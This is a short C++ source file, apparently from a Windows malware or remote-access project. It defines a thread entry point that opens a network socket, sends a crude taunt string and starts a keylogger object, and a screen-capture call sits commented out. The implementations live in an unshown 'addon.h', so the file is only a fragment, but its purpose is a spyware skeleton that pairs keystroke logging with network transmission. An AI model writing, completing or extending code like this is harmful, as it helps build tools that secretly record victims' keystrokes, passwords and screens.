#pragma once

#include "addon.h"

extern addonThread* gThread;
extern addonMutex* gMutex;
addonSocket* gSocket;
addonKeylog* gKeylog;




DWORD _stdcall main_thread(void* lpParam)
{
	gSocket = new addonSocket();

	gSocket->Send(std::string("ololo motherfuck!1"));

	gKeylog = new addonKeylog();

	//CaptureBMP(L"screen.bmp");

	return 1;
}